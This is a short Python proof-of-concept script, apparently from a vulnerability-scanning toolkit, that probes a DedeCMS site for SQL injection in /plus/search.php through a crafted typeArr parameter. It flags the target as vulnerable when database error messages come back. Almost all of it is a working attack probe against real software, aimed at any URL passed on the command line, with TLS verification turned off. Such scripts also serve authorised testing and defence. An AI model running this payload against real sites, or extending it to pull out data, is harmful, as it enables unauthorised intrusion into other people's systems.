#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: dedecms search.php SQL注入漏洞
referer: http://0daysec.blog.51cto.com/9327043/1571372
author: Lucifer
description: dedecms /plus/search.php typeArr存在SQL注入，由于有的waf会拦截自行构造EXP。
'''
import sys
import requests



class dedecms_search_typeArr_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/plus/search.php?keyword=test&typeArr[%20uNion%20]=a"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"Error infos" in req.text and r"Error sql" in req.text:
                return "[+]存在dedecms search.php SQL注入漏洞...(高危)\tpayload: "+vulnurl

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = dedecms_search_typeArr_sqli_BaseVerify(sys.argv[1])
    testVuln.run()